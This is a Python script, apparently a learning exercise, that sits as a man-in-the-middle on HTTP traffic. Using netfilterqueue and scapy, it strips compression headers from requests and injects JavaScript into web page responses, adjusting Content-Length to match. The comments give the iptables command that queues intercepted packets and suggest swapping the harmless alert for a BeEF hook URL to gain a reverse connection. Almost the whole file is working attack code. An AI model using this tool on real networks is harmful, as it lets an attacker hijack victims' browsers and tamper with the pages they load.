#!/usr/bin/env python

import netfilterqueue                                   #library to access the queue that is stored using iptables.
import scapy.all as scapy
import re                                               #regex library

def set_load(packet,load):                              #function to replace the load with the crafted load and return the packet.
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
   scapy_packet=scapy.IP(packet.get_payload())              #wrapping the payload of the packet into IP layer of the scapy packet.
                                                            #this is done to convert the packet into a scapy packet which is easy to interacy with.
   if scapy_packet.haslayer(scapy.Raw):                     #using the haslayer function to check raw layer in response packet
      load = scapy_packet[scapy.Raw].load
      if scapy_packet[scapy.TCP].dport == 80:                #to check if the packet is a HTTP request
         load=re.sub("Accept-Encoding:.*?\\r\\n","",load)    #Detecting the regex and replacing it with "" at load.(removes encoding)

         # print("[+]HTTP request")
         # print(scapy_packet.show())
      elif scapy_packet[scapy.TCP].sport == 80:
                # print("[+]HTTP response")
                # print(scapy_packet.show())
                injection_code = "<script>alert('TEST!!!');</script>"     #Any java script to be executed by the browser
                                #Beef javascript url can be given to get a reverse connection.
                load= load.replace("</body>",injection_code + "</body>")  #replacing a 1st arg with 2nd arg within load.



                # browser keeps track of the no.of character server should send

                content_length_search=re.search("(?:Content-Length:\s)(\d*)",load)  #searching for the contentlength server has sent and storing only the digit. and storing the value
                if content_length_search and "text/html" in load:                   #checking if the load is a htmlpage and has content length in it.
                    content_length=content_length_search.group(1)                   #assigning only the digit from the array.
                    new_content_length= int(content_length) + len(injection_code)   #content length after adding the injection code
                    print(content_length)
                    load=load.replace(content_length,str(new_content_length))       #replacing with new content length, changing int to str as packets treat it as stings


      if load != scapy_packet[scapy.Raw].load:               #if the above if statements get executed then,
          new_packet = set_load(scapy_packet, load)

          packet.set_payload(str(new_packet))                #attaching the fully crafted scapy_packet into packet.

   packet.accept()

queue = netfilterqueue.NetfilterQueue()         #creating an instance of netfilterqueue object
queue.bind(1,process_packet)                    #bind is a method from NetfilteQueue object.
                                                # it is used to add the existing iptables list that is created; to the queue instance that we have created.
                                                #"1" is the name os the list that we store the iptables content.
                                                # process_packet is the call back functionfunction that gets executed for the each packet.
queue.run()                                     #to run the queue that is created.



#COMMENTS:
#attacker needs to be man in the middle.
#before runninng make sure to run the command to collect all the packets in a queue
# "iptables -I forward -j NFQUEUE --que-num 1" ADD A NUMBER

#WORKS only in http packets.